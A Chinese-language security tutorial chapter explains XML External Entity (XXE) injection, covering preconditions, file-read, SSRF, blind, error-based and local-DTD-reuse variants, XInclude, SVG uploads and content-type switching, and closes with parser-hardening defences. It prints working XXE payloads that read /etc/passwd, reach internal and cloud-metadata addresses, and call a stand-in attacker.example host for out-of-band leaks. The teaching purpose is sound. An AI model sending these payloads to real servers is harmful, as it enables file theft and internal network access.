# 08 - XML 外部实体注入（XXE）

## 1. 漏洞本质

XXE，全称 XML External Entity Injection，即 XML 外部实体注入。该漏洞的本质是：**应用在解析用户可控 XML 数据时，允许解析器加载并展开外部实体，导致攻击者可以借助 XML 解析器读取本地文件、访问内网资源，或触发带外网络请求。**

XXE 不是单纯的“XML 语法问题”，而是 XML 解析过程中的危险特性被错误暴露给了用户输入。XML 本身支持 DTD、实体、自定义实体、外部实体等机制；当服务端解析器默认开启外部实体解析，且用户可以控制 XML 内容或 XML 子内容时，攻击者就可以让解析器替自己访问 `file://`、`http://` 等外部资源。

典型风险包括：

| 风险类型   | 说明                                        |
| ------ | ----------------------------------------- |
| 本地文件读取 | 通过 `file://` 外部实体读取服务器文件                  |
| SSRF   | 通过 `http://` 外部实体让服务器访问内网或后端服务            |
| 盲 XXE  | 响应中不回显实体内容，但可以通过 OAST、错误消息或外部 DTD 泄露数据    |
| 隐藏攻击面  | SVG、DOCX、SOAP、XML-RPC、内容类型切换等场景中触发 XML 解析 |

需要注意的是，XXE 的危险点不在于“请求里出现了 XML”，而在于**服务端 XML 解析器是否解析了攻击者可控的 DTD / 外部实体 / XInclude 等危险结构**。

## 2. 风险成立条件

XXE 风险成立通常依赖以下几个条件。

第一，**服务端存在 XML 解析行为**。该行为可能直接出现在接口中，例如 `Content-Type: application/xml`、SOAP 请求、XML-RPC 请求；也可能隐藏在文件解析流程中，例如 SVG 图片、Office 文档、配置文件导入等。

第二，**攻击者能够控制 XML 文档本身**，或者能够控制会被嵌入 XML 文档中的某个数据片段。前者可以直接插入 `DOCTYPE` 和 `ENTITY`；后者不能控制完整 XML 结构时，可能需要考虑 XInclude 等变体。

第三，**XML 解析器允许处理危险特性**，包括外部实体、外部 DTD、参数实体、XInclude、网络访问或本地文件访问。很多 XXE 漏洞并不是业务代码主动读取文件，而是解析库在展开实体时自动完成了资源访问。

第四，**服务端运行环境具备可访问资源**。比如读取 `/etc/passwd` 依赖类 Unix 文件系统；访问云元数据地址依赖云环境；访问内网管理接口依赖服务器网络位置；带外利用依赖目标环境能够向外发起 DNS 或 HTTP 请求。

简单说，XXE 不是“有 XML 就有漏洞”，而是：

```text
用户可控 XML 输入
        ↓
服务端 XML 解析器处理
        ↓
DTD / 外部实体 / XInclude 被启用
        ↓
解析器访问本地文件、内网地址或外部 DTD
        ↓
文件读取、SSRF、OAST 泄露或错误回显
```

## 3. XML 解析机制与外部实体

理解 XXE 需要先区分几个核心概念：XML、DTD、实体、外部实体、参数实体。

XML 是一种结构化数据格式，本身只负责描述数据结构。实体是 XML 中表示数据的一种机制，类似“引用替换”。例如 XML 内置实体 `&lt;` 会被解析为 `<`，`&gt;` 会被解析为 `>`。

DTD，即 Document Type Definition，用于定义 XML 文档结构和实体声明。DTD 可以直接写在 XML 文档内部，也可以从外部文件加载。XXE 的关键危险点就在于：DTD 中可以声明外部实体，而外部实体的内容可以来自本地文件或 URL。

典型外部实体声明如下：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

这里的 `xxe` 是一个外部实体。解析器在处理 `&xxe;` 时，会尝试读取 `file:///etc/passwd` 的内容，并把读取结果替换到 XML 文档中。

这个样例说明的是外部实体展开机制，适用边界是：解析器允许 DTD，允许外部实体，并且运行进程对目标文件有读取权限。现代框架或安全配置可能默认禁用相关能力，因此不能把该样例理解为所有 XML 接口都可用。

外部实体也可以指向 HTTP URL：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.example.local/">
]>
```

这种形式解释的是 SSRF 机制：请求不是从攻击者浏览器发出，而是由服务端 XML 解析器发出。是否能造成实际影响，取决于服务端网络位置、目标内网资源是否可达、解析器是否允许网络加载外部实体。

参数实体是另一类特殊实体，通常在 DTD 内部使用，声明时使用 `%`：

```xml
<!ENTITY % xxe SYSTEM "http://attacker.example/evil.dtd">
%xxe;
```

参数实体在盲 XXE、外部 DTD 加载、错误消息泄露中更常见。它的重点不是直接把内容插入业务字段，而是控制 DTD 解析流程本身。

## 4. 主要利用形态

### 4.1 文件读取型 XXE

文件读取型 XXE 是最直观的利用形态。攻击者通过外部实体引用本地文件，然后让实体内容出现在响应中。

典型结构：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

如果服务端会把 `productId` 的解析结果带入响应，例如返回“无效商品 ID：xxx”，那么实体展开后的文件内容可能被直接回显。

这个样例的成立条件包括：

- XML 文档中的 `DOCTYPE` 没有被禁用；

- 外部实体解析没有被禁用；

- `productId` 节点的值会进入响应；

- 服务端进程对目标文件有读取权限。

文件读取型 XXE 的风险边界也很清楚：它通常读取的是**服务端本地文件**，不是任意数据库内容；能读到什么取决于进程权限、文件路径、操作系统和解析器行为。Windows、Linux、容器环境中的敏感文件路径也不同。

### 4.2 SSRF 型 XXE

当外部实体指向 HTTP URL 时，XXE 可以转化为 SSRF。攻击者让服务器端解析器访问某个内部地址，从而探测或访问原本无法从公网直接访问的资源。

典型形式：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

如果实体内容被响应回显，攻击者可能直接看到内部服务响应；如果不回显，也可能通过响应时间、错误差异或带外交互判断请求是否发生。

云环境中，XXE SSRF 可能进一步访问元数据服务，例如：

```text
http://169.254.169.254/
```

该样例只用于说明云元数据风险，实际能否利用取决于云厂商元数据服务版本、防护机制、请求头要求、网络策略和实例权限。现代云环境通常会对元数据访问增加额外保护，不能把旧式元数据访问视为通用结论。

### 4.3 盲 XXE

盲 XXE 指的是：应用存在外部实体解析，但响应中不直接返回实体内容。此时无法通过普通回显读取文件，需要借助带外请求、外部 DTD 或错误消息。

最基础的盲 XXE 检测思路是让解析器访问攻击者控制的地址：

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.example/callback">
  %xxe;
]>
```

如果攻击者控制的服务收到 DNS 查询或 HTTP 请求，说明服务端解析器确实处理了外部实体。

盲 XXE 的利用通常比回显型更依赖环境。常见方式包括：

| 方式        | 核心机制                     | 边界                  |
| --------- | ------------------------ | ------------------- |
| OAST 检测   | 触发 DNS / HTTP 出网请求       | 只能证明请求发生，不一定能读取文件   |
| 外部 DTD 泄露 | 加载攻击者控制的 DTD，把文件内容拼进外带请求 | 依赖目标可出网、解析器允许外部 DTD |
| 错误消息泄露    | 构造不存在路径，让错误消息包含文件内容      | 依赖错误信息回显和解析器行为      |
| 本地 DTD 复用 | 重新定义本地已有 DTD 中的实体，引发错误泄露 | 依赖本地存在可复用 DTD，技巧性较强 |

盲 XXE 的关键不是“没有回显就没有漏洞”，而是要判断解析器是否仍然会访问外部资源或生成可控错误。

### 4.4 基于错误消息的数据泄露

部分 XML 解析器会把文件路径、实体展开结果、加载失败路径写入错误消息。如果应用把 XML 解析错误直接返回给前端，就可能形成错误型 XXE。

典型思路是将敏感文件内容拼入一个不存在的路径中，让解析器报错：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

该样例解释的是“通过解析错误携带敏感数据”的机制。它不适用于所有解析器，因为不同 XML 库对参数实体、URL 字符合法性、换行符、错误消息展示方式的处理差异较大。某些文件内容包含换行或特殊字符时，也可能无法直接拼入 URL。

## 4.5 本地 DTD 复用型盲 XXE

本地 DTD 复用是一种特殊的盲 XXE 利用方式，主要用于以下场景：

应用存在 XXE，但**无法通过响应直接回显实体内容**；目标服务器又无法访问攻击者控制的**外部 DTD**，导致常规带外泄露不可用。此时，如果服务器本地文件系统中存在**可被 XML 解析器加载的 DTD 文件**，攻击者可以尝试**复用这个本地 DTD**，并通过**重新定义**其中已有的**参数实体**来触发**错误型数据泄露**。

这个技巧的核心不是“直接读取本地 DTD”，而是利用 **内部 DTD 与外部 DTD 混合解析时的实体重定义规则**。

普通内部 DTD 中，很多解析器不允许在一个参数实体定义内部再引用另一个参数实体。也就是说，下面这种“参数实体套参数实体”的结构，在纯内部 DTD 中通常会被限制：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

该限制会影响错误型 XXE，因为错误型泄露往往需要把敏感文件内容拼入另一个实体声明中，再通过访问不存在路径触发错误消息。

但如果 XML 文档**同时使用了内部 DTD 和外部 DTD**，情况会发生变化。XML 解析器在加载外部 DTD 时，会解析其中已经声明的参数实体；而内部 DTD 又可以重新定义外部 DTD 中的某些参数实体。这样一来，攻击者就可以借助本地已有 DTD 的实体声明位置，绕开纯内部 DTD 对参数实体嵌套的限制。

可以把它理解成：

```
纯内部 DTD：
攻击者想直接声明复杂参数实体
        ↓
解析器可能拒绝

混合 DTD：
先加载服务器本地已有 DTD
        ↓
内部 DTD 重新定义其中某个参数实体
        ↓
解析器按外部 DTD 语境处理该实体
        ↓
触发错误型 XXE
```

典型结构如下：

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

  <!ENTITY % target_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>

  %local_dtd;
]>
```

这里的关键点有三个。

第一，`local_dtd` 指向的是服务器本地已经存在的 DTD 文件。它不是攻击者远程托管的 DTD，因此在目标服务器禁止外连时仍可能被加载。

第二，`target_entity` 必须对应本地 DTD 中真实存在、并且可被重定义的参数实体名称。上面的名称只是机制示意，真实环境中需要根据目标本地 DTD 文件内容选择可重定义实体。

第三，`file:///nonexistent/%file;` 的作用不是读取不存在文件，而是故意构造一个不存在路径，让解析器在报错时把拼接后的路径带出来。如果 `%file;` 成功展开，错误消息中就可能包含目标文件内容。

该机制对应的风险链路是：

```
目标允许解析 DOCTYPE
        ↓
允许加载本地 file:// DTD
        ↓
本地存在可复用 DTD 文件
        ↓
内部 DTD 可重定义外部 DTD 中的参数实体
        ↓
错误消息回显给用户
        ↓
敏感文件内容进入错误信息
```

本地 DTD 复用的实际利用门槛比普通 XXE 高很多。它依赖多个条件同时成立：

| 条件           | 说明                         |
| ------------ | -------------------------- |
| 允许 DTD 解析    | 如果 `DOCTYPE` 被禁用，该技巧直接失效   |
| 允许加载本地外部 DTD | 解析器需要允许 `file://` 读取本地 DTD |
| 本地存在可复用 DTD  | 常见路径和系统环境有关，不同发行版差异很大      |
| 可重定义实体存在     | 必须找到本地 DTD 中合适的参数实体        |
| 错误消息可见       | 如果解析错误被统一吞掉或隐藏，就难以泄露数据     |
| 目标文件内容适合拼接   | 换行、特殊字符、URL 非法字符可能影响错误路径构造 |

常见可能被测试的本地 DTD 路径包括：

```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/sgml/docbook/dtd/xml/4.1.2/docbookx.dtd
/usr/share/yelp/dtd/docbookx.dtd
C:\Windows\System32\wbem\xml\cim20.dtd
```

这些路径只能作为环境判断样例，不能写成通用结论。Linux 桌面环境、Java 中间件、Windows 系统组件、容器镜像裁剪程度不同，都会影响本地 DTD 是否存在。原始资料中也明确提到，该方式依赖“服务器文件系统中恰好存在的 DTD 文件”，并且需要对其中实体进行重新定义，才能触发包含敏感数据的解析错误。

从防护角度看，本地 DTD 复用再次说明：只禁止外连并不等于彻底防住 XXE。即使目标不能访问攻击者服务器，只要解析器仍允许加载本地 DTD、允许实体重定义，并且错误信息可见，仍可能产生盲 XXE 数据泄露。

更稳的防护应该是：

```
禁用 DOCTYPE
禁用外部实体
禁用外部 DTD
禁止 XML 解析器访问本地文件和网络资源
关闭 XInclude
不要向用户返回底层 XML 解析错误
```

一句话概括：**本地 DTD 复用型盲 XXE 是在无法加载远程恶意 DTD 时，借助服务器本地已有 DTD 的参数实体声明位置，重新定义实体并触发错误消息泄露的高级变体。**

## 5. 隐藏攻击面与变体

XXE 不一定只出现在明显的 XML API 中。很多真实场景中，攻击面隐藏在“业务看起来不是 XML，但底层会解析 XML”的流程里。

### 5.1 XInclude

当攻击者不能控制完整 XML 文档，无法插入 `DOCTYPE` 时，仍可能通过 XInclude 影响服务端 XML 构造流程。典型场景是：用户提交的某个字段被服务端嵌入后端 XML 文档，然后再交给 XML 解析器处理。

典型形式：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

XInclude 的利用边界是：解析器或后续处理流程需要启用 XInclude 支持，并且用户输入确实会被作为 XML 子内容处理。它不是经典 `DOCTYPE + ENTITY` 的替代万能 payload，而是另一类 XML 包含机制。

### 5.2 文件上传触发 XXE

某些文件格式本质上包含 XML 或 XML 子结构，例如 SVG、DOCX、XLSX、某些配置文件和图形文档。如果应用上传后会在服务端解析这些文件，就可能触发 XXE。

典型例子是 SVG：

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>
  <text>&xxe;</text>
</svg>
```

这个样例说明的是 SVG 作为 XML 文档被服务端解析时的风险。它不代表“上传 SVG 就一定 XXE”，还需要满足服务端使用的图像库、文档处理库或转换器实际解析 DTD / 外部实体。

### 5.3 内容类型切换

有些接口表面上接收表单数据或 JSON，但后端框架可能同时兼容 XML 请求体。如果接口根据 `Content-Type` 自动选择解析器，攻击者可能通过修改内容类型触发 XML 解析链路。

例如原请求是：

```http
Content-Type: application/x-www-form-urlencoded

foo=bar
```

攻击者可能尝试改为：

```http
Content-Type: application/xml

<foo>bar</foo>
```

该机制的风险点不在于内容类型本身，而在于后端是否会因为内容类型变化而调用 XML 解析器，并且该解析器是否启用了危险特性。

### 5.4 XML 编码与其他漏洞组合

XML 只是数据承载格式。如果 XML 中某个字段最终进入 SQL 查询、HTML 页面、模板渲染或命令拼接，仍然可能形成 SQL 注入、XSS、SSTI、命令注入等其他漏洞。

XML 实体编码还可能影响过滤器判断。例如某些安全过滤只检查原始字符串，而业务解析后才得到真实字符，可能产生过滤绕过。但这类问题本质上属于“解析顺序差异”，不应和 XXE 混为一谈。

## 6. 常见成因与防护原则

XXE 的根因通常不是业务代码主动实现了危险功能，而是 XML 解析器默认支持了业务不需要的能力。防护重点是：**禁用危险 XML 特性，而不是试图靠关键词过滤拦截 payload。**

核心防护原则如下：

| 防护点         | 说明                                |
| ----------- | --------------------------------- |
| 禁用 DTD      | 最直接切断 `DOCTYPE`、实体声明、外部 DTD       |
| 禁用外部实体      | 禁止解析 `SYSTEM` / `PUBLIC` 外部实体     |
| 禁用外部资源加载    | 阻止解析器访问本地文件和网络 URL                |
| 禁用 XInclude | 避免用户字段触发 XML 包含                   |
| 使用安全解析器配置   | 不依赖默认配置，按语言和库显式设置                 |
| 限制出网能力      | 即使解析器误配置，也降低 SSRF 和 OAST 风险       |
| 避免错误回显      | 不向用户返回底层 XML 解析错误细节               |
| 文件解析隔离      | 对 SVG、Office、配置导入等文件处理流程做沙箱和格式白名单 |

不推荐把防护建立在字符串黑名单上，例如简单过滤 `DOCTYPE`、`ENTITY`、`file://`。原因是 XML 存在编码、大小写、外部 DTD、参数实体、嵌套解析、不同解析器差异等问题，黑名单很容易漏掉变体。更稳定的方案是在解析器层面关闭不需要的 XML 特性。

工程上可以按这个思路排查：

```text
是否必须使用 XML？
        ↓
若必须使用，是否需要 DTD / 外部实体 / XInclude？
        ↓
如果不需要，全部禁用
        ↓
限制解析器访问本地文件和网络
        ↓
对上传文件、SOAP、XML-RPC、内容类型切换做单独测试
```

**风险成立条件：**  
服务端存在 XML 解析行为，攻击者可控 XML 或 XML 子内容，解析器允许 DTD / 外部实体 / XInclude 等危险特性，并且服务器环境中存在可访问的本地文件、内网服务或外部网络。

**常见利用方向：**  
回显型文件读取、XXE SSRF、盲 XXE OAST 检测、外部 DTD 带外泄露、错误消息泄露、SVG / DOCX / SOAP / 内容类型切换等隐藏攻击面。

**防护重点：**  
在 XML 解析器层面禁用 DTD、外部实体、外部 DTD、XInclude 和外部资源加载；同时限制服务端出网、避免解析错误回显，并对文件上传和 XML 兼容接口做单独加固。
